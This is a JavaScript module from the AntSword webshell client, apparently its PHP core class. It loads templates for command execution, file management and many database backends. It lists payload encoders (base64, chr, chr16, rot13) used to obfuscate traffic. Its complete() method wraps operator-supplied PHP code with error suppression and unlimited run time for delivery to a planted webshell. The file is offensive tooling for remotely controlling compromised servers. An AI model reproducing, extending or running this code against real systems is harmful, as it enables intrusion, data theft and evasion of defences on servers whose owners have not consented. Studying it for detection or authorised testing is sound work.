/**
 * PHP服务端脚本模板
 * 开写：2016/04/12
 * 更新：-
 * 作者：蚁逅 <https://github.com/antoor>
 */
'use strict';

// import Base from '../base';
const Base = require('../base');

class PHP extends Base {
  constructor(opts) {
    super(opts);
    // 解析模板
    [
      'base', 'command', 'filemanager',
      'database/mysql',
      'database/mysqli',
      'database/mssql',
      'database/sqlsrv',
      'database/oracle',
      'database/oracle_oci8',
      'database/postgresql',
      'database/postgresql_pdo',
      'database/informix'
    ].map((_) => {
      this.parseTemplate(`./php/template/${_}`);
    });
    // 解析编码器
    this.encoders.map((_) => {
      this.parseEncoder(`./php/encoder/${_}`);
    });
  }

  /**
   * 获取编码器列表
   * ? 可以在antSword.core.php.prototype.encoders中获取此变量
   * @return {array} 编码器列表
   */
  get encoders() {
    return ["base64", "chr", "chr16", "rot13"];
  }

  /**
   * HTTP请求数据组合函数
   * @param  {Object} data 通过模板解析后的代码对象
   * @return {Promise}     返回一个Promise操作对象
   */
  complete(data) {
    // 分隔符号

    let tag_s = Math.random().toString(16).substr(2, 5); // "->|";
    let tag_e = Math.random().toString(16).substr(2, 5); // "|<-";

    // 组合完整的代码
    let tmpCode = data['_'];
    data['_'] = `@ini_set("display_errors", "0");@set_time_limit(0);echo "${tag_s}";try{${tmpCode};}catch(Exception $e){echo "ERROR://".$e->getMessage();};echo "${tag_e}";die();`;

    // 使用编码器进行处理并返回
    return this.encodeComplete(tag_s, tag_e, data);
  }
}

module.exports = PHP;
